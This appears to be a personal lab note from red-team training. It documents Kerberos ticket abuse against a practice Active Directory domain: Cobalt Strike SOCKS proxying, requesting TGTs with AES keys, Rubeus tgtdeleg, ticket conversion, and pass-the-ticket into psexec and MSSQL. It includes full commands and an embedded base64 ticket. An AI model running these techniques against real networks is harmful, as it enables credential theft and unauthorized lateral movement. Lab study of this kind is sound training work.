First ensure that `proxychains socks proxy` is setup through `cobaltstrike` in this case I am using `DEV\bfarmer` on `WKSTN-2` with  a `socks5` tunnel.
ensure that `/etc/proxychains` contains the correct proxy 

use the command `proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking` to query the `DC` for `DEV\jking`'s `TGT` with the use of `Kerberos Encyption Keys`
[[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/access_Tracker|access_Tracker]]
![[Pasted image 20231201181821.png]]
the `TGT` is then saved into `jking.ccache`
ccache format can be used with `impacket` scripts, create an environmental variable called `KRB5CCNAME` pointing to the `ccache` file

`export KRB5CCNAME=jking.ccache` to assign `KRB5CCNAME` variable to be able to use `psexec`
`proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io` to utilize `psexec` once the varibale is assigned with a `TGT`

![[Pasted image 20231201182411.png]]


# Generating `ticket.kirbi`
*If you have a ticket in kirbi format obtained with another tool, it can be converted to ccache format for use with Impacket.  For example, here I'm using the TGT delegation trick to get a usable TGT for bfarmer from a non-elevated session.*

on  `WKSTN-2` as `DEV\bfarmer` use the command to generate a `ticket.kirbi` `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap`
`ticket.kirbi` saved to [[Penetration Testing v2/crto_Defender/access_Tracker|access_Tracker]]
![[Pasted image 20231201183322.png]]
Base64 decode the ticket and write it to `bfarmer.kirbi`
```bash
echo -en 'doIFzjCCBcqgAwIBBaEDAgEWooIExTCCBMFhggS9MIIEuaADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBHMwggRvoAMCARKhAwIBAqKCBGEEggRdi4eWtoeE0fwOQuhF9TRvIdGz34FRc0Zu1AldqsDVf/tV4lmHICxKqLx29zuuLMO3TcnEZMVAO75se7B2ogfs+doyuOxdkVDO93cgHsqgFqf9MIa4ZhjRpvIur1OvtlwoLXeSXT1crlQbmWf2iTVB0Ff3xZOqffuoMN5GKmwgA87bcj3RJQ0EviZTfLuyp2wLlaaZaiQoozp6W0J2s9WKJyrxgeyePOf8NenpFAfE+cQ5MOf+R0LwDRFwKWZuf8NN1NWjBIhex/wQZrH/2LRb3Sk8OJ73PK2EyYupjsEVy+mjuIJsoYAeOxTlVG9AYLPYZCX89VnF0FGptAm2syOegvp2NuDTJL60HmqC++96A56X8exs/rm5pK0HugUwHFvl7AtgV0jT4BE0ZIkT9nN8JyMzhx9SXYqHAdO4WUmT4y//58sLD0Z2reoXJrf+v8ibWJ2MkxUppBriXryt2/5qDm5+pYRm6j0KV/CYzSAAqeIwKA89I54PBiY8LIH6M1hyfOHki4jjFK69iCLGdPshbxGJDVrTy5Jof2DR/KEUx6L8DiGyd7vuzXODb+sdj2roxftttfVn/NdLpF9Xyu3SaOvdvMCLX/qckA8lTpC5+yDT//MiyzpmnPco5qaw2KJkSN0J5Wsn/11tHqnX8UBrVGrX3BHU/xF4WYYQRSCk6Q2kiorG0/7nPkhs802SihcV2q0k2aMHRZa1wqiGdW1/I3NQcvjmyhSrU0sflO/tcP1G7z494jgdK3Mt07rK43lMrZ8h+NuLez/syuqRrxU4Vy/bUL/d6KqQYp/mnXXcEGm33qLPixppFqIQkKxFmZCwmZingiKQ3DeutgHBqjcVdqsqF3jNu0IFtvBHaxRlpESGIgbk1ijs/L4EBbXveFyxr+xJMMWe5qhPhR03cVXmsfJMomgVLrny6e6Gq+kCVBXO1u0HaxFaqvNnERmoPxGg0VIU9vH+8sqFKImtF153N2KFloSvi9JVjz32nuSGrjAanA+MychzAFOo9D3VDifmJmm3FCRdgrNTw36E5Pi75ycFrDHkSkU9J0CPv7KyMBNFzWP3GUiYpDVZm8CuorXVrltQawdYD1OtCx8DgKevFqklEzYoc7xcCaQ8RQNBSqbaTsd9i4zi7CLKd11ZR1QNzxpThRZgSosZNygrxQduQHij3YOexuXQ3YTXAv7kJDhcARhb3pCKyQRNCZaL/6PJx1XyoA4QB7/WsIwDMj7R+6OkWrDyouakA7BQIzKGIRFH562msaSbPsw/XUQEfP7S/fcXq+daMbsArtbaF+jeUbLYcl0wZ5vPcRlBt/7JLp+c9vpCopgC5VEYhcy2XRBr+OtoIHEgsnD1HandDY64MZQz5aS6m9yO4XC8sRoQwCW6ycVGfjwDIVKzXkyown7NnxAFIZeHtrmqu7PoC85o+4qDNlY/jSVtIrH9LvakCg2FMkbiFJlV+9F2S72G7gQjt5f76befSKTT/POumKOB9DCB8aADAgEAooHpBIHmfYHjMIHgoIHdMIHaMIHXoCswKaADAgESoSIEICF/0sTJ2JYNYLWKCABw8q0qGh/xtbDL0LdNgXaaat+JoRMbEURFVi5DWUJFUkJPVElDLklPohQwEqADAgEBoQswCRsHYmZhcm1lcqMHAwUAYKEAAKURGA8yMDIzMTIwMTIyNTEwOFqmERgPMjAyMzEyMDIwODUxMDhapxEYDzIwMjMxMjA4MjI1MTA4WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=' | base64 -d > bfarmer.kirbi
```
![[Pasted image 20231201183926.png]]
convert the `ticket.kirbi` to a `.ccache` file
`ticketConverter.py bfarmer.kirbi bfarmer.ccache`
![[Pasted image 20231201184151.png]]
add `remote_dns` to `/etc/proxychains.conf` to allow communication to a remote dns
![[Pasted image 20231201190639.png]]
add `10.10.122.25    sql-2.dev.cyberbotic.io` to `/etc/hosts` to enable communication
![[Pasted image 20231201190751.png]]
assign `export KRB5CCNAME=bfarmer.ccache` to enable use of `.ccache` file with `impacket` tools
![[Pasted image 20231201191125.png]]
`proxychains mssqlclient.py -dc-ip 10.10.122.10 -no-pass -k dev.cyberbotic.io/bfarmer@sql-2.dev.cyberbotic.io`
on as `SQL-2`
![[Pasted image 20231201191236.png]]

# Abusing Kerberos Tickets from Windows Attacker Machine

*did not work for me*
on the `Attacker Desktop` modifier the `Proxifier` app settings to have `*.cyberbotic.io` under `Profile -> Poxification RUles -> tools -> edit`
![[Pasted image 20231201191823.png]]
![[Pasted image 20231201191850.png]]

in a `powershell` session launch `runas /netonly /user:dev.cyberbotic.io\bfarmer powershell.exe` to execute a remote `powershell.exe` as `bfarmer`
![[Pasted image 20231201195318.png]]
*in order to interact with this remote session must copy and paste commands because for whatever reason keyboard input is not working*

`klist` to list kerberos tickets
![[Pasted image 20231201195640.png]]

pasteable, didnt work and error'd
```

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:doIFzjCCBcqgAwIBBaEDAgEWooIExTCCBMFhggS9MIIEuaADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBHMwggRvoAMCARKhAwIBAqKCBGEEggRdi4eWtoeE0fwOQuhF9TRvIdGz34FRc0Zu1AldqsDVf/tV4lmHICxKqLx29zuuLMO3TcnEZMVAO75se7B2ogfs+doyuOxdkVDO93cgHsqgFqf9MIa4ZhjRpvIur1OvtlwoLXeSXT1crlQbmWf2iTVB0Ff3xZOqffuoMN5GKmwgA87bcj3RJQ0EviZTfLuyp2wLlaaZaiQoozp6W0J2s9WKJyrxgeyePOf8NenpFAfE+cQ5MOf+R0LwDRFwKWZuf8NN1NWjBIhex/wQZrH/2LRb3Sk8OJ73PK2EyYupjsEVy+mjuIJsoYAeOxTlVG9AYLPYZCX89VnF0FGptAm2syOegvp2NuDTJL60HmqC++96A56X8exs/rm5pK0HugUwHFvl7AtgV0jT4BE0ZIkT9nN8JyMzhx9SXYqHAdO4WUmT4y//58sLD0Z2reoXJrf+v8ibWJ2MkxUppBriXryt2/5qDm5+pYRm6j0KV/CYzSAAqeIwKA89I54PBiY8LIH6M1hyfOHki4jjFK69iCLGdPshbxGJDVrTy5Jof2DR/KEUx6L8DiGyd7vuzXODb+sdj2roxftttfVn/NdLpF9Xyu3SaOvdvMCLX/qckA8lTpC5+yDT//MiyzpmnPco5qaw2KJkSN0J5Wsn/11tHqnX8UBrVGrX3BHU/xF4WYYQRSCk6Q2kiorG0/7nPkhs802SihcV2q0k2aMHRZa1wqiGdW1/I3NQcvjmyhSrU0sflO/tcP1G7z494jgdK3Mt07rK43lMrZ8h+NuLez/syuqRrxU4Vy/bUL/d6KqQYp/mnXXcEGm33qLPixppFqIQkKxFmZCwmZingiKQ3DeutgHBqjcVdqsqF3jNu0IFtvBHaxRlpESGIgbk1ijs/L4EBbXveFyxr+xJMMWe5qhPhR03cVXmsfJMomgVLrny6e6Gq+kCVBXO1u0HaxFaqvNnERmoPxGg0VIU9vH+8sqFKImtF153N2KFloSvi9JVjz32nuSGrjAanA+MychzAFOo9D3VDifmJmm3FCRdgrNTw36E5Pi75ycFrDHkSkU9J0CPv7KyMBNFzWP3GUiYpDVZm8CuorXVrltQawdYD1OtCx8DgKevFqklEzYoc7xcCaQ8RQNBSqbaTsd9i4zi7CLKd11ZR1QNzxpThRZgSosZNygrxQduQHij3YOexuXQ3YTXAv7kJDhcARhb3pCKyQRNCZaL/6PJx1XyoA4QB7/WsIwDMj7R+6OkWrDyouakA7BQIzKGIRFH562msaSbPsw/XUQEfP7S/fcXq+daMbsArtbaF+jeUbLYcl0wZ5vPcRlBt/7JLp+c9vpCopgC5VEYhcy2XRBr+OtoIHEgsnD1HandDY64MZQz5aS6m9yO4XC8sRoQwCW6ycVGfjwDIVKzXkyown7NnxAFIZeHtrmqu7PoC85o+4qDNlY/jSVtIrH9LvakCg2FMkbiFJlV+9F2S72G7gQjt5f76befSKTT/POumKOB9DCB8aADAgEAooHpBIHmfYHjMIHgoIHdMIHaMIHXoCswKaADAgESoSIEICF/0sTJ2JYNYLWKCABw8q0qGh/xtbDL0LdNgXaaat+JoRMbEURFVi5DWUJFUkJPVElDLklPohQwEqADAgEBoQswCRsHYmZhcm1lcqMHAwUAYKEAAKURGA8yMDIzMTIwMTIyNTEwOFqmERgPMjAyMzEyMDIwODUxMDhapxEYDzIwMjMxMjA4MjI1MTA4WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8= /service:MSSQLSvc/sql-2.dev.cyberbotic.io:1433 /dc:dc-2.dev.cyberbotic.io /ptt
```

![[Pasted image 20231201201822.png]]


